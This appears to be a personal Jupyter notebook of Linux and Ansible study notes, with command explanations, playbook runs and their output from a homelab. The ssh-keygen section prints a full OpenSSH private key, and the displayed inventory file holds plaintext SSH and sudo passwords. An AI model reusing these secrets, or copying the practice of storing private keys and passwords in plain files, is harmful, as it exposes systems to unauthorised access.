# %% [markdown]
# # **AWS**

# %% [markdown]
# # **Linux**

# %% [markdown]
# ## Docs

# %% [markdown]
# #### [free linux playground](https://webterm.app/en/free-play)

# %% [markdown]
# ## Linux References

# %% [markdown]
# #### **Linux Shell Commands**

# %%
from IPython.display import IFrame

IFrame(
    "https://explainshell.com/",
    width="100%",
    height=700
)
# Out:
#         <iframe
#             width="100%"
#             height="700"
#             src="https://explainshell.com/"
#             frameborder="0"
#             allowfullscreen
#
#         ></iframe>

# %% [markdown]
# #### **Man-Pages**

# %%
from IPython.display import IFrame

IFrame(
    "https://www.kernel.org/doc/man-pages/",
    width="100%",
    height=700
)
# Out:
#         <iframe
#             width="100%"
#             height="700"
#             src="https://www.kernel.org/doc/man-pages/"
#             frameborder="0"
#             allowfullscreen
#
#         ></iframe>

# %% [markdown]
# ## Definiitions

# %% [markdown]
# #### **sed**
# A command-line tool for editing text
#
# #### **sort**
# Places identical hostnames next to each other
#
# #### **setgid bit**
# When this is enabled, all new files and subdirectories inherit the directory's group ownership instead of the creator's primary group
#
# #### **sticky bit**
# With the sticky bit enabled, users can delete only files they own, even if they have write permission to the directory
# *Normally, users with write permission to a directory can delete any file inside it*
#
# #### **wc**
# command will print just the number of lines, words, and characters in the output
#
# #### **df**
# df displays filesystem disk-space usage
# **df -h**
# The -h option means “human-readable,” so sizes are shown using units such as M and G instead of only bytes

# %% [markdown]
# ## Commands

# %% [markdown]
# #### grep
#
# ***cat /etc/os-release | grep -i os***
# **grep -R "DB_NAME"**
# **grep -n 'replicas:' /home/labex/project/scale-lab/hostname-web.yaml**
# **grep -rl copyright**
# **grep -r copyright | wc**
# **grep -R copyright | wc**
# **grep -r copyright > ~/lowercase.txt**
# **grep -R copyright > ~/uppercase.txt**
# **ls -l /usr/share/doc/ | grep debconf**
# **cat git/README.source | grep extracted**
# **cat git/README.source | grep -B 5 extracted**
# **ps aux | grep root**
# **ps aux | grep ^root** only return processes that start with root
# **ps aux | grep d$** --only return characters that end with the letter d
#     - -i means case-insensitive
#     - -E enables extended regular expressions, which is what lets you easily search for multiple alternatives using |
#     - -n includes the matching line number
#     - 'replicas:' is the text being searched for
# **grep copyright** --cd /usr/share/doc
# *Running grep copyright to search for all files containing the word copyright will fail*
# *This happens because grep, when it's run like this, expects searchable text via standard input (stdin) - but this command doesn't provide any. You can escape the failed command by typing CTRL+c*
# **grep -r copyright**
# *the -r flag to the grep command so it will search recursively for all the files in the current directory tree that contain the text copyright*
# ***grep -rl copyright***
# *Add the l flag to that command if you want grep to print nothing more than the directory and file names*
# **grep -r copyright | wc**
# **grep -R copyright | wc**
#     - the uppercase -R flag instead of the lowercase -r will recursively return even objects that are symbolic links
# **cat git/README.source | grep -A 2 extracted**
# *Add the -A flag to grep with the value of 2 to print the two lines that come after the matching line*
# **cat git/README.source | grep -B 5 extracted**
# *If you need to see the lines that come before the matching line, use the -B flag along with some value instead of -A*
# **cat git/README.source | grep -C 4 extracted**
# *If you want to see both lines before and after the matching line, use the -C (context) flag*
#
# #### ps aux
# *Run ps along with the aux arguments to list all the processes currently active on your machine*
# *This will show you each process along with information like the user who owns it, its process ID (PID), resource usage, and the original command that was used to execute the process*
#
# **ps aux**
# **ps aux | grep root**
# **ps aux | grep ^root**
# *The ^ character tells grep to return only lines that begin with (in this case) the word root*
# **ps aux | grep d$**
# *The $ character will work similarly by telling grep to return only lines that end with a specified character (or characters)*
#
#
# #### sed
#
# ***sed -i 's/nginx:1.27-alpine-missing/nginx:1.27-alpine/' broken-web.yaml***
#     - sed: A command-line tool for editing text.
#     - -i: Edits the file directly, rather than only displaying the modified content
#     - 's/old/new/': The substitution pattern:
#         - s means “substitute.”
#         - nginx:1.27-alpine-missing is the text to find
#         - nginx:1.27-alpine is the replacement text
#         - broken-web.yaml: The file being edited
#
# #### sort / uniq -c
#
# ***sort /tmp/hostname-responses.txt | uniq -c***
# **sort -u /tmp/hostname-responses.txt | wc -l**
#     - sort places identical hostnames next to each other
#     - | sends the sorted output to the next command
#     - uniq -c combines adjacent duplicate lines and prefixes each hostname with its count
#     - -u means “unique,” so duplicate hostnames are removed
#
# #### wc -l
#
# **sort -u /tmp/hostname-responses.txt | wc -l**
#     - wc counts text
#     - -l tells it to count lines
#
# #### find /type
# **find . -type d -perm -002**
# **sudo find /var/www/todo -type d -exec chmod 2775 {} \;**
#     - cd Frontend/ && ls
#     - find . -name "health.html"
#
# #### systemctl
# * **systemctl is-enabled httpd**
# * **sudo systemctl enable httpd**
# * **sudo systemctl daemon-reload**
# * **systemctl status todo-init.service --no-pager**
#
# #### journalctl
# **sudo journalctl -u todo-init.service**
#     -The -u option filters the journal by systemd unit
# **journalctl -xeu todo-init.service**
# **sudo journalctl -u todo-init.service -n 20**
#
# #### getent
# **getent hosts registry-1.docker.io**
# **getent ahostsv4 registry-1.docker.io**
# **getent group frontend_group**
#
# #### curl
# * **curl -I --connect-timeout 10 https://registry-1.docker.io/v2/**
# * **curl -4 -I --connect-timeout 10 https://registry-1.docker.io/v2/**
# * **curl -6 -I --connect-timeout 10 https://registry-1.docker.io/v2/**
# **curl -4 -I --connect-timeout 10 https://example.com**
# **curl -4 -I --connect-timeout 10 https://aws.amazon.com**
#
# #### sysctl
# **sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1**
# **sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1**
#
# #### ssh-keygen
# *Remote Server*
# **ssh-keygen -t ed25519 -C "lab-key"** --press enter for default file location
# **cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys**
#     - This command adds the public key to list of auth keys
# **chmod 700 ~/.ssh**
# **chmod 600 ~/.ssh/authorized_keys**
# **cat ~/.ssh/id_ed25519**
# *Copy the private key from the server you want to ssh into
# -----BEGIN OPENSSH PRIVATE KEY-----
# b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
# QyNTUxOQAAACA+SYELbidgxsE0fskVBlC3ZJ/r/nT0SeqybZ7Odzjs3AAAAJAcf1ilHH9Y
# pQAAAAtzc2gtZWQyNTUxOQAAACA+SYELbidgxsE0fskVBlC3ZJ/r/nT0SeqybZ7Odzjs3A
# AAAEDNZgeDJQHhhKAkT0TVBIk1WP9kUzpodRiK7uUuQ5hJJj5JgQtuJ2DGwTR+yRUGULdk
# n+v+dPRJ6rJtns53OOzcAAAAB2xhYi1rZXkBAgMEBQY=
# -----END OPENSSH PRIVATE KEY-----
#
# *Server you will be remoting in from*
# **mkdir -p ~/.ssh**
# **add_key**
# a. Press i to enter insert mode
# b. Paste in the private key you retrieve in earlier steps at the top of this editor
# c. Press Esc
# d. Use the command :wq and press Enter to save the key and exit
# **ssh -i /home/cloud_user/.ssh/id_dropbear sysadmin@ip_from_server_above**
# *Type y and press Enter if prompted to confirm the authenticity of the host -- as this will ssh into the server without needing a passowrd*
#
# #### Groups
# **sudo groupadd frontend_group**
# **sudo groupadd backend_group**
# **sudo groupadd admin_group**
# *Note: You can verify that a group was created successfully with the getent command. For example:*
# **getent group frontend_group**
#
# ##### Add user to groups
# **sudo usermod -aG frontend_group frontend1**
# **sudo usermod -aG backend_group backend1**
# **sudo usermod -aG admin_group admin1**
# **groups frontend1**
# **sudo usermod -aG frontend_group admin1**
# **sudo usermod -aG backend_group admin1**
# **groups admin1**
#
# #### user manegement
# **sudo useradd -m frontend1**
# *This creates a user called frontend1*
# **sudo useradd -m backend1**
# **sudo useradd -m admin1**
#
# ##### passwd
# **sudo passwd frontend1**
# **sudo passwd frontend2**
# **sudo passwd backend1**
# **sudo passwd admin1**
# **su - frontend1**
#
# #### chown
# **sudo chown -R root:frontend_group Frontend**
# **sudo chown -R root:backend_group Backend**
#
# #### ls
# **ls -ld Frontend Backend**
#
# #### chmod
# **sudo chmod -R 770 Frontend**
# **sudo chmod -R 777 Backend**
#
# #### setgid
# **sudo chmod g+s Frontend**
# *This enables the setgid bit on the frontend directory
# **ls -ld Frontend**
#
# #### sticky bits
# **sudo chmod +t Frontend**
# **ls -ld Frontend**
# *In the permission string, verify that you see an s and a T, indicating that the setgid and sticky bits are enabled*
#
# #### diff
# **diff ~/lowercase.txt ~/uppercase.txt**
#
# #### ss
# **ss -tulpn | grep 8085**
# **sudo ss -tulpn | grep ':8085'**
#
# #### df -h
# df displays filesystem disk-space usage
# The -h option means “human-readable,” so sizes are shown using units such as M and G instead of only bytes
#
# #### who
# who
# *shows active login sessions*
# w
# *this shows who is logged in and what each session is doing:*
#
# #### users
# users
# *This command shows all logged in users on the machine*
#
# #### uptime
# uptime
# *This command will show the uptime of all hosts in the webservers group*
#
# #### free
# **free -h**
# *This command will show the memory usage on all hosts in the dbservers group*
#
# #### rpm -qa | grep -E 'nrpe|nagios-plugins'
# rpm -ql nrpe | grep '\.cfg'
#
# #### sudo
# sudo -l
#
# #### iostat -xz 5
#
#
# #### ip -br link
# ethtool <interface>
# ethtool enp2s0
# curl -o /dev/null https://speed.cloudflare.com/__down?bytes=100000000

# %% [markdown]
# # **Ansible**

# %% [markdown]
# ## Ansible Docs

# %% [markdown]
# ### Links

# %% [markdown]
# ##### [Ansible Community Documentation](https://docs.ansible.com/projects/ansible/latest/index.html)
# ##### [Modules Index](https://docs.ansible.com/projects/ansible/latest/collections/index_module.html)
# ##### [Ansible Pilot](https://www.ansiblepilot.com/articles/ansible-documentation)

# %% [markdown]
# ## Command Oneliners

# %% [markdown]
# #### Ping Commands

# %%
# !ansible r8airbourne -i /home/sysadmin/Documents/ansible/inventory.ini -m ping
# Out:
# r8airbourne | SUCCESS => {
#     "changed": false,
#     "ping": "pong"
# }

# %%
# !ansible all -i /home/sysadmin/Documents/ansible/inventory.ini -m ping -e "ansible_user=sysadmin ansible_password=YourPassword"
# Out:
# [WARNING]: Host 'localhost' is using the discovered Python interpreter at '/usr/bin/python3.14', but future installation of another Python interpreter could cause a different interpreter to be discovered. See https://docs.ansible.com/ansible-core/2.21/reference_appendices/interpreter_discovery.html for more information.
# localhost | SUCCESS => {
#     "ansible_facts": {
#         "discovered_interpreter_python": "/usr/bin/python3.14"
#     },
#     "changed": false,
#     "ping": "pong"
# }
# [WARNING]: Host 'k8s-controller' is using the discovered Python interpreter at '/usr/bin/python3.9', but future installation of another Python interpreter could cause a different interpreter to be discovered. See https://docs.ansible.com/ansible-core/2.21/reference_appendices/interpreter_discovery.html for more information.
# k8s-controller | SUCCESS => {
#     "ansible_facts": {
#         "discovered_interpreter_python": "/usr/bin/python3.9"
#     },
#     "changed": false,
# ...

# %% [markdown]
# #### whoami

# %%
# !ansible all -i /home/sysadmin/Documents/ansible/inventory.ini -m command -a "whoami" --become
# Out:
# localhost | CHANGED | rc=0 >>
# root
# k8s-controller | CHANGED | rc=0 >>
# root

# %% [markdown]
# #### uptime

# %%
# !ansible all -i /home/sysadmin/Documents/ansible/inventory.ini -a "uptime"
# Out:
# localhost | CHANGED | rc=0 >>
#  21:08:08 up 14 days,  1:47,  6 users,  load average: 2.46, 2.24, 2.47
# k8s-controller | CHANGED | rc=0 >>
#  21:08:08 up 38 days, 9 min,  2 users,  load average: 0.11, 0.09, 0.12

# %%
# !ansible local -i /home/sysadmin/Documents/ansible/inventory.ini -a "uptime"
# Out:
# localhost | CHANGED | rc=0 >>
#  11:27:00 up 12 days, 16:06,  5 users,  load average: 3.44, 2.83, 2.67

# %%
# !ansible debian -i /home/sysadmin/Documents/ansible/inventory.ini -a "uptime"
# Out:
# k8s-controller | CHANGED | rc=0 >>
#  11:26:37 up 36 days, 14:27,  2 users,  load average: 0.05, 0.10, 0.09

# %% [markdown]
# #### ansible config

# %%
# !ansible-config dump

# %%
# !ansible-config dump | grep -i Action
# Out:
# ACTION_WARNINGS(default) = True
# DEFAULT_ACTION_PLUGIN_PATH(default) = ['/home/sysadmin/.ansible/plugins/action', '/usr/share/ansible/plugins/action']
# VALIDATE_ACTION_GROUP_METADATA(default) = True

# %% [markdown]
# #### disk space

# %%
# !ansible all -i /home/sysadmin/Documents/ansible/inventory.ini -m command -a "df -h"
# Out:
# localhost | CHANGED | rc=0 >>
# Filesystem      Size  Used Avail Use% Mounted on
# /dev/nvme0n1p2  932G   76G  853G   9% /
# devtmpfs        7.5G     0  7.5G   0% /dev
# tmpfs           7.7G  422M  7.3G   6% /dev/shm
# efivarfs        256K  181K   71K  72% /sys/firmware/efi/efivars
# tmpfs           3.1G  3.9M  3.1G   1% /run
# none            1.0M     0  1.0M   0% /run/credentials/systemd-journald.service
# tmpfs           7.7G  179M  7.5G   3% /tmp
# /dev/nvme0n1p2  932G   76G  853G   9% /root
# /dev/nvme0n1p2  932G   76G  853G   9% /srv
# /dev/nvme0n1p2  932G   76G  853G   9% /home
# /dev/nvme0n1p2  932G   76G  853G   9% /var/tmp
# /dev/nvme0n1p2  932G   76G  853G   9% /var/log
# /dev/nvme0n1p2  932G   76G  853G   9% /var/cache
# /dev/nvme0n1p1  511M  664K  511M   1% /boot/efi
# overlay         932G   76G  853G   9% /var/lib/docker/rootfs/overlayfs/06d26c8b67144bb0760e6f9ea19075498255b55dbbb2a04ce76e6feaad212ac6
# ...

# %% [markdown]
# #### inventory info

# %%
# !cat /home/sysadmin/Documents/ansible/inventory.ini
# Out:
# # Replace the example names/IPs below with your hosts.
#
# [local]
# localhost ansible_connection=local ansible_python_interpreter=/usr/bin/python3.14
#
# [debian]
# # debian-01 ansible_host=192.168.1.10 ansible_user=your_user
# k8s-controller ansible_host=10.0.0.140 ansible_connection=ssh ansible_user=sysadmin ansible_python_interpreter=/usr/bin/python3.9
# # ansible debain -i inventory.ini -m ping --ask-become-pass
# # ansible_user=sysadmin
#
# #[arch]
# # arch-01 ansible_host=192.168.1.20 ansible_user=your_user
# #localhost ansible_host=localhost
# #ansible_user=sysadmin python_interpreter=/usr/bin/python3
#
# [rhel]
# # rhel-01 ansible_host=192.168.1.30 ansible_user=your_user
#
# [all:vars]
# ansible_user=sysadmin
# ansible_password=Passw0rd
# ansible_become=true
# ansible_become_method=sudo
# ansible_become_password=Passw0rd
# #ansible_connection=ssh
# #ansible_user=sysadmin
# #ansible_become=true
# #ansible_become_method=sudo
# #
# ...

# %% [markdown]
# #### ram usage

# %%
# !ansible all -i /home/sysadmin/Documents/ansible/inventory.ini -m command -a "free -h"
# Out:
# localhost | CHANGED | rc=0 >>
#                total        used        free      shared  buff/cache   available
# Mem:            15Gi       8.9Gi       5.1Gi       997Mi       2.9Gi       6.4Gi
# Swap:           15Gi        11Gi       4.1Gi
# k8s-controller | CHANGED | rc=0 >>
#                total        used        free      shared  buff/cache   available
# Mem:           7.3Gi       3.6Gi       627Mi       330Mi       3.7Gi       3.7Gi
# Swap:             0B          0B          0B

# %%
#because the command module is the default module, you can omit the -m command option and just use -a to specify the command to run
# !ansible all -i /home/sysadmin/Documents/ansible/inventory.ini -a "free -h"
# Out:
# localhost | CHANGED | rc=0 >>
#                total        used        free      shared  buff/cache   available
# Mem:            15Gi       9.4Gi       4.5Gi       1.2Gi       3.1Gi       5.9Gi
# Swap:           15Gi        10Gi       5.2Gi
# k8s-controller | CHANGED | rc=0 >>
#                total        used        free      shared  buff/cache   available
# Mem:           7.3Gi       3.6Gi       414Mi       339Mi       3.9Gi       3.7Gi
# Swap:             0B          0B          0B

# %% [markdown]
# #### setup

# %%
#This module when ran gathers facts about the remote hosts and returns them to the control node The gathered facts can be used in playbooks and templates to make decisions based on the state of the remote hosts
# !ansible all -i /home/sysadmin/Documents/ansible/inventory.ini -m setup

# %%
# This command only gathers hosts facts related to the distribution of the operating system -- The filter option allows you to specify which facts to gather, in this case, only those related to the distribution of the operating system
# !ansible all -i /home/sysadmin/Documents/ansible/inventory.ini -m setup -a "filter=ansible_distribution*"
# Out:
# localhost | SUCCESS => {
#     "ansible_facts": {
#         "ansible_distribution": "Archlinux",
#         "ansible_distribution_file_path": "/etc/arch-release",
#         "ansible_distribution_file_variety": "Archlinux",
#         "ansible_distribution_major_version": "rolling",
#         "ansible_distribution_release": "n/a",
#         "ansible_distribution_version": "rolling"
#     },
#     "changed": false
# }
# k8s-controller | SUCCESS => {
#     "ansible_facts": {
#         "ansible_distribution": "OracleLinux",
#         "ansible_distribution_file_parsed": true,
#         "ansible_distribution_file_path": "/etc/oracle-release",
#         "ansible_distribution_file_search_string": "Oracle Linux",
#         "ansible_distribution_file_variety": "OracleLinux",
#         "ansible_distribution_major_version": "9",
#         "ansible_distribution_release": "NA",
#         "ansible_distribution_version": "9.8"
#     },
#     "changed": false
# }

# %% [markdown]
# ## Running Playbooks

# %% [markdown]
# #### handle_command_failure.yaml

# %%
# !ansible-playbook /home/sysadmin/Documents/ansible/handle_command_failure.yaml -i /home/sysadmin/Documents/ansible/inventory.ini

# %% [markdown]
# #### pass_variables.yaml

# %%
# !ansible-playbook /home/sysadmin/Documents/ansible/pass_variables.yaml -i /home/sysadmin/Documents/ansible/inventory.ini
# Out:
# PLAY [Pass Variables to Shell Commands] ****************************************
#
# TASK [Gathering Facts] *********************************************************
# ok: [localhost]
#
# TASK [Execute ls command with a variable] **************************************
# changed: [localhost]
#
# TASK [Display variable command output] *****************************************
# ok: [localhost] => {
#     "variable_command_output.stdout_lines": [
#         "AGENTS.md",
#         "ansible",
#         "Applications",
#         "bookmarks.yaml",
#         "Build out Terraform Server.md",
#         "Command_Guru",
#         "Command Guru.zip",
#         "Desktop",
#         "Documents",
#         "Downloads",
#         "doxker-compose",
#         "Excalidraw",
#         "file-browser-test",
#         "flag.txt",
#         "gitlab",
#         "go",
#         "homelab_server_setups",
#         "homepage",
#         "htb",
#         "__init__.py",
#         "inventory.ini",
# ...

# %% [markdown]
# #### simple_shell_command.yaml

# %%
# !ansible-playbook /home/sysadmin/Documents/ansible/simple_shell_command.yaml -i /home/sysadmin/Documents/ansible/inventory.ini
# Out:
# PLAY [Execute a Simple Shell Command] ******************************************
#
# TASK [Gathering Facts] *********************************************************
# ok: [localhost]
#
# TASK [Execute ls -l command] ***************************************************
# changed: [localhost]
#
# TASK [Display command output] **************************************************
# ok: [localhost] => {
#     "command_output.stdout_lines": [
#         "total 48",
#         "-rw-r--r-- 1 sysadmin sysadmin 1938 Jul 20 23:58 create_and_switch_branch.yml",
#         "-rw-r--r-- 1 sysadmin sysadmin  857 Aug 22 16:57 host_info.yaml",
#         "-rw-r--r-- 1 sysadmin sysadmin  918 Aug 27 20:50 inventory.ini",
#         "-rw-r--r-- 1 sysadmin sysadmin  222 Aug 24 21:35 loop_example.yaml",
#         "-rw-r--r-- 1 sysadmin sysadmin  564 Aug 24 21:35 multiple_condionals.yaml",
#         "-rw-r--r-- 1 sysadmin sysadmin  154 Aug 22 16:37 ping.yaml",
# ...

# %% [markdown]
# #### ssh_service_checker.yaml

# %%
# !ansible-playbook /home/sysadmin/Documents/ansible/ssh_service_checker.yaml -i /home/sysadmin/Documents/ansible/inventory.ini
# Out:
# PLAY [Check and manage SSH service in Docker] **********************************
#
# TASK [Gathering Facts] *********************************************************
# ok: [k8s-controller]
# ok: [docker-lxc]
#
# TASK [Check SSH service status] ************************************************
# [ERROR]: Task failed: Module failed: The command exited with a non-zero return code.
# Origin: /home/sysadmin/Documents/ansible/ssh_service_checker.yaml:6:7
#
# 4   become: yes # This allows Ansible to use sudo
# 5   tasks:
# 6     - name: Check SSH service status
#         ^ column 7
#
# ...

# %%
# !ansible debian -i /home/sysadmin/Documents/ansible/inventory.ini -m ping
# Out:
# docker-lxc | SUCCESS => {
#     "changed": false,
#     "ping": "pong"
# }
# k8s-controller | SUCCESS => {
#     "changed": false,
#     "ping": "pong"
# }

# %% [markdown]
# #### process_output.yaml

# %%
# !ansible-playbook /home/sysadmin/Documents/ansible/process_output.yaml -i /home/sysadmin/Documents/ansible/inventory.ini
# Out:
# PLAY [Capture and process command output] **************************************
#
# TASK [Gathering Facts] *********************************************************
# ok: [localhost]
# ok: [k8s-v2]
# ok: [k8s-controller]
# ok: [docker-lxc]
#
# TASK [Get disk usage information] **********************************************
# changed: [localhost]
# changed: [docker-lxc]
# changed: [k8s-v2]
# changed: [k8s-controller]
#
# TASK [Display all partitions] **************************************************
# ok: [localhost] => {
#     "msg": [
#         "Filesystem      Size  Used Avail Use% Mounted on",
#         "/dev/nvme0n1p2  932G  109G  820G  12% /",
#         "devtmpfs        7.5G     0  7.5G   0% /dev",
#         "tmpfs           7.7G  611M  7.1G   8% /dev/shm",
#         "efivarfs        256K  181K   71K  72% /sys/firmware/efi/efivars",
#         "tmpfs           3.1G  3.9M  3.1G   1% /run",
# ...

# %% [markdown]
# #### varible_command.yaml

# %%
# !ansible-playbook /home/sysadmin/Documents/ansible/varible_command.yaml -i /home/sysadmin/Documents/ansible/inventory.ini
# Out:
# PLAY [Use variables with the Command module] ***********************************
#
# TASK [Gathering Facts] *********************************************************
# ok: [localhost]
# ok: [k8s-v2]
# ok: [k8s-controller]
# ok: [docker-lxc]
#
# TASK [Display the last few lines of a file] ************************************
# changed: [localhost]
# changed: [docker-lxc]
# changed: [k8s-v2]
# changed: [k8s-controller]
#
# TASK [Show the command output] *************************************************
# ok: [localhost] => {
#     "command_output.stdout_lines": [
#         "flatpak:x:958:958:Flatpak system helper:/:/usr/bin/nologin",
#         "sddm:x:957:957:SDDM Greeter Account:/var/lib/sddm:/usr/bin/nologin",
#         "zabbix:x:955:955:Zabbix User:/var/lib/zabbix:/usr/bin/nologin",
#         "valkey:x:954:954:Redis in-memory data structure store:/var/lib/valkey:/usr/bin/nologin",
#         "nrpe:x:31:31:NRPE:/:/usr/bin/nologin"
#     ]
# }
# ok: [k8s-controller] => {
# ...

# %% [markdown]
# #### simple_command.yaml

# %%
# !ansible-playbook /home/sysadmin/Documents/ansible/simple_commnd.yaml -i /home/sysadmin/Documents/ansible/inventory.ini
# Out:
# PLAY [Execute a simple command] ************************************************
#
# TASK [Gathering Facts] *********************************************************
# ok: [localhost]
# ok: [k8s-v2]
# ok: [k8s-controller]
# ok: [docker-lxc]
#
# TASK [Run 'ls' command] ********************************************************
# changed: [localhost]
# changed: [k8s-v2]
# changed: [docker-lxc]
# changed: [k8s-controller]
#
# PLAY RECAP *********************************************************************
# docker-lxc                 : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
# k8s-controller             : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
# k8s-v2                     : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
# localhost                  : ok=2    changed=1    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0

# %% [markdown]
# #### loop_example.yaml

# %%
# !ansible-playbook /home/sysadmin/Documents/ansible/loop_example.yaml -i /home/sysadmin/Documents/ansible/inventory.ini
# Out:
# PLAY [Loop Example] ************************************************************
#
# TASK [Gathering Facts] *********************************************************
# ok: [k8s-controller]
# ok: [localhost]
#
# TASK [Print fruit names] *******************************************************
# ok: [k8s-controller] => (item=apple) => {
#     "msg": "Current fruit: apple"
# }
# ok: [localhost] => (item=apple) => {
#     "msg": "Current fruit: apple"
# }
# ok: [k8s-controller] => (item=banana) => {
#     "msg": "Current fruit: banana"
# }
# ok: [localhost] => (item=banana) => {
#     "msg": "Current fruit: banana"
# }
# ok: [k8s-controller] => (item=cherry) => {
#     "msg": "Current fruit: cherry"
# }
# ok: [localhost] => (item=cherry) => {
#     "msg": "Current fruit: cherry"
# }
#
# PLAY RECAP *********************************************************************
# k8s-controller             : ok=2    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
# ...

# %% [markdown]
# #### host Info

# %%
# !ansible-playbook /home/sysadmin/Documents/ansible/host_info.yaml -i /home/sysadmin/Documents/ansible/inventory.ini
# Out:
# PLAY [Gather system information from all hosts] ********************************
#
# TASK [Gathering Facts] *********************************************************
# ok: [k8s-controller]
# ok: [localhost]
#
# TASK [Display system information] **********************************************
# ok: [localhost] => {
#     "msg": [
#         "Hostname: cachyv2",
#         "FQDN: cachyv2",
#         "OS: Archlinux rolling",
#         "Kernel: 7.1.5-1-cachyos",
#         "Architecture: x86_64",
#         "CPU: 16 vCPU(s)",
#         "Memory: 15647 MB",
#         "Default IPv4: 10.0.0.193",
#         "Python: 3.14.7",
#         "Uptime: 15 day(s)"
#     ]
# }
# ok: [k8s-controller] => {
#     "msg": [
#         "Hostname: k8s-controller",
#         "FQDN: k8s-controller",
#         "OS: OracleLinux 9.8",
#         "Kernel: 5.15.0-321.202.5.3.el9uek.x86_64",
#         "Architecture: x86_64",
#         "CPU: 2 vCPU(s)",
#         "Memory: 7475 MB",
#         "Default IPv4: 10.0.0.140",
# ...

# %% [markdown]
# #### ping Test

# %%
# !ansible-playbook /home/sysadmin/Documents/ansible/ping.yaml -i /home/sysadmin/Documents/ansible/inventory.ini
# Out:
# PLAY [Test connectivity to all hosts] ******************************************
#
# TASK [Gathering Facts] *********************************************************
# ok: [localhost]
# ok: [k8s-v2]
# ok: [k8s-controller]
# ok: [docker-lxc]
#
# TASK [Ping hosts] **************************************************************
# ok: [localhost]
# ok: [docker-lxc]
# ok: [k8s-v2]
# ok: [k8s-controller]
#
# PLAY RECAP *********************************************************************
# docker-lxc                 : ok=2    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
# k8s-controller             : ok=2    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
# k8s-v2                     : ok=2    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
# localhost                  : ok=2    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0

# %% [markdown]
# #### sudo Access

# %%
# !ansible-playbook /home/sysadmin/Documents/ansible/test_sudo.yaml -i /home/sysadmin/Documents/ansible/inventory.ini
# Out:
# PLAY [Test sudo access on all hosts] *******************************************
#
# TASK [Gathering Facts] *********************************************************
# ok: [localhost]
# ok: [k8s-controller]
#
# TASK [Check current user] ******************************************************
# ok: [localhost]
# ok: [k8s-controller]
#
# TASK [Display current user] ****************************************************
# ok: [localhost] => {
#     "msg": "Running as: root"
# }
# ok: [k8s-controller] => {
#     "msg": "Running as: root"
# }
#
# PLAY RECAP *********************************************************************
# k8s-controller             : ok=3    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
# localhost                  : ok=3    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0

# %%
# !ls -l /home/sysadmin/Documents/ansible/
# Out:
# total 16
# -rw-r--r-- 1 sysadmin sysadmin 1938 Jul 20 23:58 create_and_switch_branch.yml
# -rw-r--r-- 1 sysadmin sysadmin 1035 Aug 22 16:27 inventory.ini
# -rw-r--r-- 1 sysadmin sysadmin  154 Aug 22 16:37 ping.yml
# -rw-r--r-- 1 sysadmin sysadmin  357 Aug 22 16:40 test_sudo.yml

# %%
# !ansible-playbook /home/sysadmin/Documents/ansible/ping.yaml -i /home/sysadmin/Documents/ansible/inventory.ini
# Out:
# PLAY [Test connectivity to all hosts] ******************************************
#
# TASK [Gathering Facts] *********************************************************
# ok: [localhost]
# ok: [k8s-controller]
#
# TASK [Ping hosts] **************************************************************
# ok: [localhost]
# ok: [k8s-controller]
#
# PLAY RECAP *********************************************************************
# k8s-controller             : ok=2    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0
# localhost                  : ok=2    changed=0    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0

# %%
# !ansible-playbook /home/sysadmin/Documents/ansible/host_info.yaml -i /home/sysadmin/Documents/ansible/inventory.ini
# Out:
# PLAY [Gather system information from all hosts] ********************************
#
# TASK [Gathering Facts] *********************************************************
# ok: [localhost]
# ok: [k8s-controller]
#
# TASK [Display system information] **********************************************
# ok: [localhost] => {
#     "msg": [
#         "Hostname: cachyv2",
#         "FQDN: cachyv2",
#         "OS: Archlinux rolling",
#         "Kernel: 7.1.5-1-cachyos",
#         "Architecture: x86_64",
#         "CPU: 16 vCPU(s)",
#         "Memory: 15647 MB",
#         "Default IPv4: 10.0.0.193",
#         "Python: 3.14.7",
#         "Uptime: 14 day(s)"
#     ]
# }
# ok: [k8s-controller] => {
#     "msg": [
#         "Hostname: k8s-controller",
#         "FQDN: k8s-controller",
#         "OS: OracleLinux 9.8",
#         "Kernel: 5.15.0-321.202.5.3.el9uek.x86_64",
#         "Architecture: x86_64",
#         "CPU: 2 vCPU(s)",
#         "Memory: 7475 MB",
#         "Default IPv4: 10.0.0.140",
# ...

# %% [markdown]
# ##### [Ansible Community Documentation](https://docs.ansible.com/projects/ansible/latest/index.html)
# ##### [Modules Index](https://docs.ansible.com/projects/ansible/latest/collections/index_module.html)
# ##### [Ansible Pilot](https://www.ansiblepilot.com/articles/ansible-documentation)

# %% [markdown]
# ## Runbooks

# %% [markdown]
# ## Jinja Templates

# %% [markdown]
# #### advanced_techniques.j2

# %% [markdown]
# ---
# ```
# {% macro render_list(title, items) %}
# {{ title }}:
# {% for item in items %}
#   - {{ item }}
# {% endfor %}
# {% endmacro %}
#
# 1. Using a macro:
# {{ render_list("Fruits", fruits) }}
#
# {{ render_list("Vegetables", vegetables) }}
#
# 2. Using set:
# {% set greeting = "Hello, " + name + "!" %}
# {{ greeting }}
#
# 3. Custom filter (defined in playbook):
# {{ complex_data | to_nice_json }}
#
# 4. Whitespace control:
# {% for item in fruits -%}
#     {{ item }}
# {%- if not loop.last %}, {% endif %}
# {%- endfor %}
#
# 5. Raw block (no processing):
# {% raw %}
# This {{ will_not_be_processed }}
# {% endraw %}
#
# 6. Include another template:
# {% include 'simple_include.j2' %}
# ```

# %% [markdown]
# #### loops.j2

# %% [markdown]
# ---
#
# 1. Simple loop:
# {% for item in simple_list %}
#    - {{ item }}
# {% endfor %}
#
# 2. Loop with index:
# {% for item in simple_list %}
#    {{ loop.index }}. {{ item }}
# {% endfor %}
#
